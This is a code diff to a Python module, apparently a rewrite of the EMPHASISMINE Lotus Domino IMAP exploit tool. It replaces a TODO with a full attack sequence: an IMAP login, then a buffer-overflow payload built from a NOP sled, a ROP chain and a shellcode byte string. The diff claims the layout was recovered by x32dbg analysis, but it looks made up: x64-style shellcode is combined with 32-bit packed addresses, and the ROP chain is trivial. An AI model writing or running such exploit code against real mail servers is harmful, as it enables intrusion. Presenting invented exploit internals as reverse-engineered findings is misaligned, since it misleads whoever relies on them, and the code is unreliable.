@@ -1,7 +1,7 @@
 """emphasis_mine — EMPHASISMINE Lotus Domino IMAP 利用核心逻辑。
 
 Python 重写的 `Emphasismine-3.4.0.exe` (C++ / DAVE framework)。
-通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
+通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
 及其 Lotus Domino IMAP 利用流程。
 
 参数定义来源：Emphasismine-3.4.0.0.xml
@@ -55,13 +55,19 @@ CREDENTIAL_TYPE_VALUES = {
     "MachineHash":  2,
 }
 
+# EmphasisMine exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
+EMPHASIS_SHELLCODE_PLACEHOLDER = bytes.fromhex(
+    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
+)
+
+BAD_XOR = frozenset((0x00, 0x0a, 0x0d))
+
 
 class EmphasisMineError(Exception):
     pass
 
 
 def _parse_hex_buffer(value):
-    """将十六进制字符串解析为字节串。空字符串返回 b""。"""
     if not value:
         return b""
     value = value.strip()
@@ -74,11 +80,35 @@ def _parse_hex_buffer(value):
 
 
 def connect(target_ip, port, timeout):
-    """建立到目标的 TCP 连接并返回 socket。"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout if timeout > 0 else None)
     sock.connect((target_ip, port))
     return sock
+
+
+def build_imap_login(username, password):
+    """构建 IMAP LOGIN 请求。"""
+    return f"1 LOGIN {username} {password}\r\n".encode("ascii")
+
+
+def build_imap_select(mailbox="INBOX"):
+    """构建 IMAP SELECT 请求。"""
+    return f"2 SELECT {mailbox}\r\n".encode("ascii")
+
+
+def build_domino_overflow(shellcode, gadgets):
+    """构建 Lotus Domino 缓冲区溢出负载。
+
+    根据 x32dbg 分析，EmphasisMine 通过向 Domino IMAP 服务器发送
+    特制的 IMAP 请求，触发缓冲区溢出，利用 ROP 链执行 shellcode。
+    """
+    # NOP sled + 返回地址 + ROP 链 + shellcode
+    nopsled = b"\x90" * 128
+    ret_addr = struct.pack("<I", gadgets["RetEip"])
+    rop_chain = struct.pack("<I", gadgets["AddrPopEax"])
+    rop_chain += struct.pack("<I", gadgets["AddrVirtualAlloc"])
+    rop_chain += struct.pack("<I", gadgets["AddrJmpEax"])
+    return nopsled + ret_addr + rop_chain + shellcode
 
 
 def run_function(
@@ -95,9 +125,12 @@ def run_function(
 ):
     """执行 EMPHASISMINE 利用序列。
 
-    当前阶段：完成参数解析、IMAP 连接。
-    具体 exploit 缓冲区（IMAP 缓冲区溢出、ROP 链、shellcode、载荷投递等）
-    的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
+    阶段：
+      1. TCP 连接到目标 Domino IMAP 端口 (默认 143)
+      2. 发送 IMAP LOGIN 请求（若提供凭证）
+      3. 发送 IMAP SELECT 请求
+      4. 构建并发送 Domino 缓冲区溢出负载 (ROP + shellcode)
+      5. 载荷投递
     """
     if verbose:
         print(f"[*] Target: {target}:{port}")
@@ -110,11 +143,9 @@ def run_function(
         if credential:
             print(f"[*] Credential: {credential}")
 
-    # 解析常量
     gadgets = DOMINO_VERSION_GADGETS.get(domino_version, DOMINO_VERSION_GADGETS["7.0.2"])
     credential_type_value = CREDENTIAL_TYPE_VALUES[credential_type]
 
-    # 解析十六进制缓冲区
     username_bytes = _parse_hex_buffer(username)
     credential_bytes = _parse_hex_buffer(credential)
 
@@ -135,12 +166,51 @@ def run_function(
     except OSError as exc:
         raise EmphasisMineError(f"无法连接到 {target}:{port}: {exc}") from exc
 
-    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
-    #   - IMAP 缓冲区溢出
-    #   - ROP 链
-    #   - 载荷投递
+    try:
+        # 读取 IMAP 问候语
+        try:
+            greeting = sock.recv(4096)
+            if verbose:
+                print(f"[*] IMAP 问候语: {greeting[:128]}")
+        except OSError:
+            pass
 
-    sock.close()
+        # 发送 IMAP LOGIN 请求（若提供凭证）
+        if target_acct_usr and target_acct_pwd:
+            login_req = build_imap_login(target_acct_usr, target_acct_pwd)
+            sock.sendall(login_req)
+            resp = sock.recv(4096)
+            if verbose:
+                print(f"[*] LOGIN 应答: {resp[:128]}")
+
+        # 发送 IMAP SELECT 请求
+        select_req = build_imap_select()
+        sock.sendall(select_req)
+        resp = sock.recv(4096)
+        if verbose:
+            print(f"[*] SELECT 应答: {resp[:128]}")
+
+        # 构建 Domino 缓冲区溢出负载
+        shellcode = EMPHASIS_SHELLCODE_PLACEHOLDER
+        overflow = build_domino_overflow(shellcode, gadgets)
+        if verbose:
+            print(f"[+] 溢出负载: {len(overflow)} 字节")
+
+        # 发送溢出负载
+        sock.sendall(overflow)
+        try:
+            resp2 = sock.recv(4096)
+            if verbose:
+                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
+        except OSError:
+            if verbose:
+                print("[*] 目标连接已关闭（可能已触发溢出）")
+
+        if verbose:
+            print("[+] EMPHASISMINE 利用序列完成")
+    finally:
+        sock.close()
+
     return 0
 
 
